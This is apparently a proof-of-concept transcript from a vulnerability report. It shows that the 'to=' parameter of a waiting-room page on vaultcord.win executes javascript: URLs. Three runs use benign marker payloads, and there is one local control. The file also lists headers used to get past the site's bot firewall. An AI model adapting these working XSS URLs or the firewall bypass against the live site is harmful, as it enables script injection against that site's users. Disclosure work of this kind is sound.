@@ -1,0 +1,28 @@
+# Level-3 browser verification transcript
+Browser: Google Chrome 151.0.7922.137 (headless=new, Puppeteer 24)
+User-Agent: Mozilla/5.0 ResponsibleReporter Gecko/20100101
+Extra request headers used to pass VaultCord's bot WAF (not needed for normal users):
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Referer: https://vaultcord.com/
+  Origin:  https://vaultcord.com
+
+## Run A (flag payload, page preserved)
+URL: https://vaultcord.win/hi?wait=1&to=javascript:window.__pwned=42;void(0)
+HTTP 200
+before: title="Verify in Server", window.__pwned=null, waiting room rendered
+after 60s: title="Verify in Server", window.__pwned=42
+=> javascript: URL executed in the vaultcord.win origin. No user interaction besides opening the URL and waiting 55s.
+
+## Run B (visual payload, screenshot)
+URL: https://vaultcord.win/hi?wait=1&to=javascript:window.__pwned=1;document.documentElement.style.background='lime';document.body.style.background='lime';void(0)
+HTTP 200
+before: body background rgb(11, 12, 16), window.__pwned=null
+after 60s: document.domain="vaultcord.win", body/html background rgb(0, 255, 0), window.__pwned=1
+Screenshot: evidence/xss-poc.png (green page proves DOM mutation by injected JS)
+
+## Run C (string-return payload)
+URL: https://vaultcord.win/hi?wait=1&to=javascript:window.__pwned=1;document.title='XSS'
+after 60s: document was replaced (title="", window reset), consistent with a javascript: URL whose completion value is a string -> script execution confirmed again.
+
+## Control (same browser, same sink)
+Local page calling location.replace(decodeURIComponent("javascript:...")) executed: title XSS_, window.__pwned=1.
